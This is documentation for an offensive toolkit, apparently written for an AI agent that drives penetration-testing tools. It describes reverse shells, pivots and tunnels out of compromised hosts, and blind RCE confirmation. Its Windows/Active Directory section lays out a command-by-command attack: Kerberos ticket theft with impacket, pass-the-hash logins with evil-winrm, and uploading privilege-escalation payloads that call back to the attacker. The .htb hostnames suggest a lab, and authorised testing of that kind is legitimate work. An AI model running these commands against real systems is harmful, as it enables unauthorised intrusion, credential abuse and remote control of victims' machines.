# MCPwn Tunnels & Reverse Shells

Bring reachability up and verify it **before** enumerating — a missing route fakes an all-filtered scan. These are catalog tools: `get_tools(domain="network")`.

## `tunnel_up` — one front-end over VPN/expose/proxy/forward

Launches the backend detached (survives the call), parses the live endpoint, tracks it for teardown. Key param: `kind`.

- **`vpn`** — OpenVPN. Profile inline (`config`) or by reference (`config_ref` = container path / artifact SHA / `mcp://artifacts/<sha>`), plus `auth_user`/`auth_pass`. Returns `iface=tun0` + assigned IP. Config written base64-safe (no inline-transfer corruption).
- **`expose`** — publish a local port to a public URL (webhooks, file serving, exposing a listener). `backend` `pinggy` (default; `protocol` http/tcp/tls, optional `token`) or `bore` (`token`=secret).
- **`proxy`** — SOCKS pivot. `chisel` (reverse SOCKS from a compromised host), `ligolo` (TUN pivot; pass `ligolo_subnet=<CIDR>` to auto-create tun+route, `ligolo_webui=True` to manage from https://127.0.0.1:11601), or `ssh` (`-D` dynamic SOCKS via a jump `server`, also writes a proxychains config). Route tools through `proxychains_run`.
- **`forward`** — point-to-point port forward over `ssh` (`-L`/`-R`) or `chisel`.

```python
run_tool("tunnel_up", {"kind":"vpn","config_ref":"mcp://artifacts/<sha>"})       # → iface=tun0, endpoint=<IP>
run_tool("tunnel_up", {"kind":"expose","backend":"bore","local_port":8000})       # → public host:port
run_tool("tunnel_up", {"kind":"proxy","backend":"ssh","server":"user@jump"})      # → socks5://127.0.0.1:1080
run_tool("tunnel_list", {}); run_tool("tunnel_status", {"tunnel_id":"tnl-…"}); run_tool("tunnel_down", {"tunnel_id":"tnl-…"})
```

## `tunnel_revshell` — reachable LHOST:LPORT + payloads

Returns a cross-OS-reachable `lhost`/`lport` and ready reverse-shell payloads. Params: `local_port`, `reach` (`auto`/`vpn`/`host`/`public`), `listener`.

Cross-OS reach logic:
- **Linux host** — the container shares host networking, so local listeners and the host VPN `tun0` are directly reachable.
- **Windows/macOS host** — the container is NAT'd. A VPN brought up **inside** the container (`tunnel_up kind=vpn`) gives it a routable `tun0`, so a callback to that IP works everywhere. With no VPN, `reach=public` publishes the port through a relay.
- `reach=auto` picks the right path.

Start the listener via `start_interactive_shell` using the emitted command.

## Out-of-band callback (no listener)

- `webhook_create({server})` — hosted webhook.site URL (zero setup).
- `webhook_requests({uuid, limit})` — read captured hits. Good for blind SSRF/RCE confirmation.

## Catching & driving a shell

- **Default to penelope, not raw nc.** `tunnel_revshell` emits a `penelope` listener by default — auto PTY upgrade, session management, and every session logged to `~/.penelope/sessions/` (authoritative transcript on disk). Use `listener="nc"` only for a throwaway one-shot. (`listener="pwncat"` still maps to penelope.)
- **penelope/pwncat are pty-only — always `start_interactive_shell`.** They need a controlling TTY (pexpect allocates one); without it they die on a termios traceback. Firing `penelope -p <port>` through `execute_command` no longer crashes or hangs: the executor **detects the pty-only listener** (seeing through `sudo`/`env` prefixes) and returns `{guard:"pty_only_listener", fallback_command:"nc -lvnp <port>", ...}` instead. Read that as *relaunch under `start_interactive_shell`* — or catch with the emitted raw `nc` and `stabilize_shell` after. It never silently runs penelope (crash) nor a blocking nc (hang-until-timeout) in the non-interactive path.
- After catching a raw shell: `stabilize_shell(interactive_id)` → target-side PTY (python→script fallback) + `TERM` fix. **Shell-aware:** it detects the remote shell first and applies the Linux upgrade only on a POSIX shell; on a Windows shell it returns `skipped=true` (a Linux `python pty` upgrade there is just error noise) and points you to the Windows path below.
- **Discrete commands: `run_in_shell(interactive_id, cmd)`** — marker-synced, returns THIS command's `output` + `exit_code` in one call (posix/powershell/cmd autodetected). Fixes fragmented reads and previous-command bleed (evil-winrm / Windows CLM).

## Windows / AD / Kerberos shells

A raw Windows callback (nc.exe, ConPtyShell, `RunasCs`) has no Unix PTY — do **not** `stabilize_shell` a POSIX way (it auto-skips). Drive it directly, or pivot to a proper channel.

- **Drive the raw callback:** `run_in_shell` autodetects `cmd` vs `powershell` and brackets each command with its own marker + `%errorlevel%`/`$LASTEXITCODE`, so you get clean scoped output even under Constrained Language Mode. Prefer it over `read_shell_output` loops.
- **Upgrade to a real TTY — pivot to evil-winrm** (needs WinRM/5985 and creds, an NTLM hash, or a Kerberos ticket): `get_tools(domain="network", query="winrm")` → the evil-winrm wrapper, or `execute_command("evil-winrm -i <dc> -u <user> -p <pass>")` as a `start_interactive_shell` (it wants a TTY). Pass-the-hash: `evil-winrm ... -H <nthash>`. It gives a clean PowerShell PTY, upload/download, and `Invoke-*` — steadier than babysitting nc.
- **Kerberos-first flow (name + realm must resolve, clock must match):**
  1. Resolve the DC FQDN **and** the REALM in `/etc/hosts` (impacket resolves the referral KDC by realm name): `printf '%s\n' '<ip> <dc.fqdn> <domain> <REALM>' | sudo tee -a /etc/hosts`.
  2. Kill clock skew (`KRB_AP_ERR_SKEW`): `get_tools(domain="network", query="kerberos time")` → `krb_time_probe` reads the DC time over SMB2 and emits a ready `faketime` wrapper; wrap the auth command with it, e.g. `faketime '<DC time>' impacket-getTGT <domain>/<user>:<pass>`.
  3. Get a TGT → ccache: `impacket-getTGT <domain>/<user>:<pass>` (or `-hashes :<nt>`), then `export KRB5CCNAME=<user>.ccache`.
  4. Use the ticket: `evil-winrm -i <dc.fqdn> -u <user> -r <REALM>` (Kerberos), or `netexec winrm <dc> -u <user> -k` / `netexec smb <dc> -u <user> -k`. Impacket scripts run as `impacket-<name>` or `<name>.py`; `kinit`/`klist` are present too.
- **Ship a payload to the Windows target** (ConPtyShell, RunasCs, a Potato): `list_payloads` → `get_payload` → `upload_to_target(backend=smb|scp|http, ...)` — the depot at `/opt/windows-payloads/` is pre-staged and PtH-aware. Then trigger it to call back to your `tunnel_revshell` LHOST:LPORT.
- **Pivot to reach an internal DC/host first** if 5985/445 aren't directly routable: `tunnel_up kind=proxy` (ligolo/chisel) then run `evil-winrm`/`netexec`/impacket through `proxychains_run`.

Quick shape:
```python
run_tool("tunnel_revshell", {"local_port":4444})                 # LHOST:LPORT + payloads
start_interactive_shell(session_id, "penelope -p 4444")           # catch (pty-backed)
# ... trigger Windows payload on target ...
run_in_shell(iid, "whoami /priv")                                 # cmd/powershell autodetected
# escalate to a clean channel once you have creds/hash/ticket:
start_interactive_shell(session_id, "evil-winrm -i dc.corp.htb -u svc -H <nthash>")
```

## Raw-channel survival (when you must use nc/socat)

A raw catcher has no remote pty: output fragments, prompts stay blank, the local pty line discipline eats control chars.
- **Output you need**: run `cmd > /tmp/o 2>&1; cat /tmp/o` — don't rely on the live stream.
- **Background watchers**: `setsid cmd &` or `nohup cmd &` — a bare `&` dies when the channel hiccups or the shell is re-caught.
- **Never SIGINT the listener to stop a remote job**: `signal_interactive_shell(SIGINT)` sends 0x03 to the LOCAL pty → the line discipline kills `nc` and the shell drops; it never reaches the remote. Use the file-redirect pattern or a remote pty.
- **pty-in-pty caveat**: `python3 -c 'import pty;pty.spawn("/bin/bash")'` shifts the local relay's echo/prompt/ANSI handling; set `stty raw -echo` locally when driving a full-screen program.
- **Prefer a stable primary channel**: an SSH key, `evil-winrm`, or operator creds beat babysitting a raw nc catcher.
